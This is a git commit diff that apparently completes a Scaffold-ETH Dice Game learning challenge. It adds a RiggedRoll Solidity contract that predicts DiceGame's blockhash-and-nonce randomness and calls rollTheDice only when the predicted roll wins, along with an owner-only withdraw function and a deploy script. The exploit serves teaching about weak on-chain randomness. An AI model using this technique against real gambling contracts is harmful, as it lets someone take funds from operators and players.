693647b815f1f1c8d9725a5e899c0b4362b848b6
xyuu98 <huahua981222@gmail.com>
2022-12-08 15:40:29 +0800

    done

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -1,4 +1,4 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
@@ -6,6 +6,7 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
+    error ROLL_NUMBER_NOT_WINNER();
 
     DiceGame public diceGame;
 
@@ -14,11 +15,35 @@ contract RiggedRoll is Ownable {
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
-
+    function withdraw(address _addr, uint256 _amount) external onlyOwner {
+        (bool suc, ) = _addr.call{value: _amount}("");
+        require(suc, "Failed to withdraw Ether");
+    }
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        require(
+            address(this).balance >= .002 ether,
+            "Failed to send enough value"
+        );
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
+        );
 
+        uint256 roll = uint256(hash) % 16;
+
+        // console.log("\t", "   Address:", address(diceGame));
+        // console.log("\t", "   Nonce:", diceGame.nonce());
+        console.log("\t", "   Dice Game Roll:", roll);
+
+        if (roll <= 2) {
+            diceGame.rollTheDice{value: 0.002 ether}();
+        } else {
+            revert ROLL_NUMBER_NOT_WINNER();
+        }
+    }
 
     //Add receive() function so contract can receive Eth
-    
+    receive() external payable {}
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,19 +9,17 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
   await deploy("RiggedRoll", {
-   from: deployer,
-   args: [diceGame.address],
-   log: true,
+    from: deployer,
+    args: [diceGame.address],
+    log: true,
   });
-  */
 
-  //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
-  //const ownershipTransaction = await riggedRoll.transferOwnership("** YOUR FRONTEND ADDRESS **");
-  
-
+  const ownershipTransaction = await riggedRoll.transferOwnership(
+    "0x036A4a851A8aaD824875D6f2b52254c8081db39C"
+  );
 };
 
 function sleep(ms) {
